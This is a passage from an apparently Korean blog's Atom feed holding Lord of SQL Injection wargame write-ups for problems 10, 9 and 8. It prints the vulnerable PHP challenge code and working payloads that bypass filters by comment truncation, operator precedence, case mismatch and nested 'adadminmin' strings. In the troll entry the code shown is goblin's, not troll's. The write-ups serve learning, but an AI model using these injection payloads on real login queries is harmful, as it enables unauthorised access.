&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 11번 golem 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.10 Skeleton</title>
    <link href="https://www.jslee.me/2019/08/21/los-write-up-10-skeleton/"/>
    <id>https://www.jslee.me/2019/08/21/los-write-up-10-skeleton/</id>
    <published>2019-08-21T14:35:49.000Z</published>
    <updated>2019-08-21T14:53:12.356Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 10번 skeleton 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p>SQL Injection을 통해 필요하지 않은 조건절을 무력화시킬 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>skeleton 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_skeleton where id='guest' and pw='&#123;$_GET[pw]&#125;' and 1=0"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"skeleton"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_skeleton where id='guest' and pw='&#123;$_GET[pw]&#125;' and 1=0"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"skeleton"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>id</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 <code>&quot;admin&quot;</code>이라는 값이 들어있음’이다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p>주석 처리 이용</p><p>MySQL에서는 <code>#</code>, <code>-- -</code>와 같은 주석문자에 이어져 나오는 문자열을 모두 무시한다.</p><p>따라서 입력값으로 <code>&#39; or id=&#39;admin&#39;%23</code>, <code>&#39; or id=&#39;admin&#39;-- -</code> 과 같이 마지막에 주석을 넣은 값을 넣으면 삽입된 문자열까지만 처리하여 문제가 풀리게 된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/skeleton_8d9cbfe1efbd44cfbbdc63fa605e5f1b.php?pw=&apos; or id=&apos;admin&apos;%23</span><br></pre></td></tr></table></figure><p>URL Encoding 후 공백은 %20, #은 %23, ‘는 %27이 된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/skeleton_8d9cbfe1efbd44cfbbdc63fa605e5f1b.php?pw=&apos; or id=&apos;admin&apos;-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_skeleton <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">#' and 1=0</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_skeleton <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">-- -' and 1=0</span></span><br></pre></td></tr></table></figure></li><li><p>논리 연산 우선순위 이용</p><p>MySQL에서 WHERE절의 논리 연산같은 경우 AND연산이 OR연산보다 우선 처리된다.</p><p>따라서 입력값으로 <code>&#39; or id=&#39;admin&#39; or &#39;1&#39;=&#39;1</code> 과 같은 값을 넣으면 <code>id=&#39;guest&#39;</code>인 행의 <code>pw</code>가 빈 문자열이 아닌 경우 논리 연산 후 결국 <code>id=&#39;admin&#39;</code>인 행을 불러오는 SQL문이 되어 문제가 풀리게 된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/skeleton_8d9cbfe1efbd44cfbbdc63fa605e5f1b.php?pw=&apos; or id=&apos;admin&apos; or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_skeleton <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="string">'admin'</span> <span class="keyword">or</span> <span class="string">'1'</span>=<span class="string">'1'</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">0</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 10번 skeleton 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.9 Vampire</title>
    <link href="https://www.jslee.me/2019/08/20/los-write-up-09-vampire/"/>
    <id>https://www.jslee.me/2019/08/20/los-write-up-09-vampire/</id>
    <published>2019-08-20T10:48:27.000Z</published>
    <updated>2019-08-20T11:08:10.063Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 9번 vampire 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>admin</code>을 빈 문자열로 교체하는 <code>str_replace()</code> 함수를 우회하여 <code>id</code>값으로 <code>admin</code>을 전달할 수 있는지 확인한다.</p><h3 id="필요-배경-지식"><a href="#필요-배경-지식" class="headerlink" title="필요 배경 지식"></a>필요 배경 지식</h3><h4 id="MySQL-대소문자-구별"><a href="#MySQL-대소문자-구별" class="headerlink" title="MySQL 대소문자 구별"></a>MySQL 대소문자 구별</h4><ul><li>MySQL은 기본적으로 대소문자 구별을 하지 않는다.</li><li>MySQL의 대소문자 구별에 대한 자세한 내용을 알고 싶다면 다음 링크를 참고하자.</li><li><a href="https://zetawiki.com/wiki/MySQL_%EB%8C%80%EC%86%8C%EB%AC%B8%EC%9E%90_%EA%B5%AC%EB%B3%84" target="_blank" rel="noopener">MySQL 대소문자 구별 - 제타위키</a></li></ul><h4 id="str-replace"><a href="#str-replace" class="headerlink" title="str_replace"></a>str_replace</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed str_replace ( mixed $search , mixed $replace , mixed $subject [, int &amp;$count ] )</span><br></pre></td></tr></table></figure><ul><li><code>str_replace</code> 함수는 문자열에서 <strong>대소문자를 구분하여</strong> 문자열 교체를 수행한다.</li><li>반환값은 치환이 완료된 문자열이다.</li><li>php의 <code>str_replace</code> 함수에 대해 잘 모르겠다면 다음 링크를 참고하자.</li><li><a href="http://php.net/manual/kr/function.str-replace.php" target="_blank" rel="noopener">PHP: str_replace - Manual</a></li></ul><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>vampire 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $_GET[id] = str_replace(<span class="string">"admin"</span>,<span class="string">""</span>,$_GET[id]);</span><br><span class="line">  $query = <span class="string">"select id from prob_vampire where id='&#123;$_GET[id]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"vampire"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">$_GET[id] = str_replace(<span class="string">"admin"</span>,<span class="string">""</span>,$_GET[id]);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>id</code>를 받고, <code>id</code>에 <code>&#39;</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <code>id</code>에 <strong>대소문자 구분 하여</strong> <code>admin</code> 이 들어 있으면 빈 문자열로 교체되고 sql문에 삽입된다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_vampire where id='&#123;$_GET[id]&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"vampire"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>id</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 <code>&quot;admin&quot;</code>이라는 값이 들어있음’이다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p>대소문자 구분 이용</p><p>PHP의 <code>str_replace</code> 함수 부분을 보면</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br></pre></td></tr></table></figure><p>치환될 대상 문자열로 <code>&quot;admin&quot;</code> 을 전달하는 것을 알 수 있다.<br><code>str_replace()</code> 함수는 대소문자를 구분하기 때문에, 이런 경우 <code>admin</code> 이라는 문자열만 치환하게 된다.</p><p>그러나 기본적으로 MySQL에서는 대소문자를 구분하지 않는다.<br>따라서 입력값으로 <code>Admin</code>, <code>ADMIN</code> 과 같이 대문자를 섞은 값을 넣으면 <code>str_replace()</code> 함수에서 필터링이 이루어지지 않아 문제가 풀리게 된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/vampire_0538b0259b6680c1ca4631a388177ed4.php?id=ADMIN</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_vampire <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'ADMIN'</span></span><br></pre></td></tr></table></figure></li><li><p><code>str_replace</code> 작동 후 완성되는 문자열 이용</p><p>PHP의 str_replace 함수 부분을 보면</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br></pre></td></tr></table></figure><p>대상 문자열 <code>&quot;admin&quot;</code> 을 빈 문자열로 치환하는 것을 알 수 있다.<br><code>str_replace()</code> 함수는 1회 작동 후 종료되기 때문에, 이런 경우 <code>admin</code> 이라는 문자열이 한 번만 빈 문자열로 치환되게 된다.<br>따라서 입력값으로 <code>adadminmin</code> 과 같이 <code>str_replace</code> 작동 후 <code>admin</code>이 되는 값을 넣으면 <code>admin</code>이 삽입되어 문제가 풀리게 된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/vampire_0538b0259b6680c1ca4631a388177ed4.php?id=adadminmin</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_vampire <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'admin'</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 9번 vampire 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.8 Troll</title>
    <link href="https://www.jslee.me/2019/08/19/los-write-up-08-troll/"/>
    <id>https://www.jslee.me/2019/08/19/los-write-up-08-troll/</id>
    <published>2019-08-19T11:21:10.000Z</published>
    <updated>2019-08-20T11:08:10.063Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 8번 troll 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>admin</code>을 필터링하는 <code>ereg()</code> 함수를 우회하여 <code>id</code>값으로 <code>admin</code>을 전달할 수 있는지 확인한다.</p><h3 id="필요-배경-지식"><a href="#필요-배경-지식" class="headerlink" title="필요 배경 지식"></a>필요 배경 지식</h3><h4 id="ereg"><a href="#ereg" class="headerlink" title="ereg"></a>ereg</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int ereg ( string $pattern , string $string [, <span class="keyword">array</span> &amp;$regs ] )</span><br></pre></td></tr></table></figure><ul><li><code>ereg</code> 함수는 문자열에서 <strong>대소문자를 구분하여</strong> 정규표현식 매치를 수행한다.</li><li>반환값은 매치된 문자열의 길이 또는 <code>FALSE</code> 이다.</li><li>php의 <code>ereg</code> 함수에 대해 잘 모르겠다면 다음 링크를 참고하자.</li><li><a href="http://php.net/manual/kr/function.ereg.php" target="_blank" rel="noopener">PHP: ereg - Manual</a></li></ul><h4 id="MySQL-대소문자-구별"><a href="#MySQL-대소문자-구별" class="headerlink" title="MySQL 대소문자 구별"></a>MySQL 대소문자 구별</h4><ul><li>MySQL은 기본적으로 대소문자 구별을 하지 않는다.</li><li>MySQL의 대소문자 구별에 대한 자세한 내용을 알고 싶다면 다음 링크를 참고하자.</li><li><a href="https://zetawiki.com/wiki/MySQL_%EB%8C%80%EC%86%8C%EB%AC%B8%EC%9E%90_%EA%B5%AC%EB%B3%84" target="_blank" rel="noopener">MySQL 대소문자 구별 - 제타위키</a></li></ul><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>goblin 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|\"|\`/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Quotes ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_goblin where id='guest' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"goblin"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'|\"|\`/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Quotes ~_~"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>no</code>를 받고, <code>no</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <code>no</code>에 <code>&#39;</code>, <code>&quot;</code>, ` 가 들어 있으면 <code>No Quotes ~_~</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_goblin where id='guest' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"goblin"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>no</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 <code>&quot;admin&quot;</code>이라는 값이 들어있음’이다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p>대소문자 구분 이용</p><p>PHP의 <code>ereg()</code> 함수 부분을 보면</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(@ereg(<span class="string">"admin"</span>,$_GET[id])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><p>정규 표현식으로 <code>&quot;admin&quot;</code> 을 전달하는 것을 알 수 있다.<br><code>ereg()</code> 함수는 대소문자를 구분하기 때문에, 이런 경우 <code>admin</code> 이라는 문자열만 매치하게 된다.</p><p>그러나 기본적으로 MySQL에서는 대소문자를 구분하지 않는다.<br>따라서 입력값으로 <code>Admin</code>, <code>ADMIN</code> 과 같이 대문자를 섞은 값을 넣으면 <code>ereg()</code> 함수에서 필터링이 이루어지지 않아 문제가 풀리게 된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/troll_6d1f080fa30a07dbaf7342285ba0e158.php?id=ADMIN</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_troll <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'ADMIN'</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 8번 troll 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.7 Orge</title>
    <link href="https://www.jslee.me/2019/08/18/los-write-up-07-orge/"/>
    <id>https://www.jslee.me/2019/08/18/los-write-up-07-orge/</id>
    <published>2019-08-17T17:10:31.000Z</published>
    <updated>2019-08-20T11:08:10.063Z</updated>
    
